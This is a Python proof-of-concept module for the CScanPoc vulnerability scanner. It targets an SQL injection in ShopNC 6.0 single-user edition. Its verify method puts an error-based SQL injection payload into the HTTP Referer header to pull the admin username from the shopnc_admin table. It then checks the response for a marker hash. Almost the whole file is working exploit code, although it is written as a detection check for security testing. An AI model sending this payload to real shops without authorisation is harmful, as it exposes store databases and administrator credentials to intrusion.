# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ShopNC_0011'  # 平台漏洞编号，留空
    name = 'ShopNC 6.0 单用户版本SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-01-31'  # 漏洞公布时间
    desc = '''
        ShopNC 6.0 单用户版本SQL注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1218/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNC'  # 漏洞应用名称
    product_version = 'ShopNC6.0 单用户版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e4c27eb7-1895-4cd7-bfea-0e597bb32400'  # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            header = {
                'referer': "{url}'and(select 1 from(select count(*),concat(floor(rand(0)*2),0x3a,(select(select(SELECT concat(admin_name,0x3a,md5(c))FROM shopnc_admin limit 0,1))from information_schema.tables limit 0,1))x from information_schema.tables group by x)a) and 1=1)#".format(url=self.target)
            }
            r = requests.post(self.target, headers=header)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
